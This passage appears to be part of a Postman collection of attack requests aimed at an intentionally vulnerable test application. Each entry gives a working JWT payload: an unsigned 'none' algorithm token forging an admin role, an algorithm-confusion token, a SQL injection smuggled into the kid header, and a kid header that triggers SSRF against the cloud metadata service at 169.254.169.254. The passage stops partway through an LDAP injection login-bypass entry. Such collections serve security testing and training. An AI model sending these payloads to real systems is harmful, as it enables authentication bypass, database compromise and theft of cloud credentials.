          }
        },
        {
          "name": "JWT Algorithm None Attack",
          "request": {
            "method": "GET",
            "header": [
              {"key": "Authorization", "value": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}
            ],
            "url": {"raw": "{{base_url}}/api/jwt/profile", "host": ["{{base_url}}"], "path": ["api", "jwt", "profile"]},
            "description": "CWE-347: JWT 'none' algorithm attack. Header: {alg:'none'}. Payload: {sub:1, username:admin, role:admin}. No signature verification. Observe: admin profile returned without valid signature."
          }
        },
        {
          "name": "JWT Algorithm Confusion (HS256 with RSA pubkey)",
          "request": {
            "method": "GET",
            "header": [
              {"key": "Authorization", "value": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.forged_sig"}
            ],
            "url": {"raw": "{{base_url}}/api/jwt/profile", "host": ["{{base_url}}"], "path": ["api", "jwt", "profile"]},
            "description": "CWE-347: Algorithm confusion attack — HS256 token verified against RSA public key as HMAC secret. Sign token with public key (which attacker knows) to forge admin JWT. Observe: profile returned."
          }
        },
        {
          "name": "JWT kid SQLi",
          "request": {
            "method": "POST",
            "header": [
              {"key": "Content-Type", "value": "application/json"},
              {"key": "Authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgT1IgJzEnPScxIn0.eyJzdWIiOiIxIn0.sig"}
            ],
            "url": {"raw": "{{base_url}}/api/jwt/refresh", "host": ["{{base_url}}"], "path": ["api", "jwt", "refresh"]},
            "description": "CWE-89: SQLi via JWT kid header. kid value: ' OR '1'='1 injected into SELECT public_key FROM jwt_keys WHERE kid='{kid}'. Observe: SQL error or arbitrary key returned."
          }
        },
        {
          "name": "JWT kid SSRF (Remote JWKS)",
          "request": {
            "method": "POST",
            "header": [
              {"key": "Content-Type", "value": "application/json"},
              {"key": "Authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS8ifQ.eyJzdWIiOiIxIn0.sig"}
            ],
            "url": {"raw": "{{base_url}}/api/jwt/refresh", "host": ["{{base_url}}"], "path": ["api", "jwt", "refresh"]},
            "description": "CWE-918: SSRF via JWT kid header set to http://169.254.169.254/latest/meta-data/. Server fetches remote key from attacker or internal URL. Observe: SSRF to metadata service."
          }
        }
      ]
    },
    {
      "name": "LDAP",
      "item": [
        {
          "name": "LDAP Injection Login Bypass",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/ldap/login", "host": ["{{base_url}}"], "path": ["api", "ldap", "login"]},
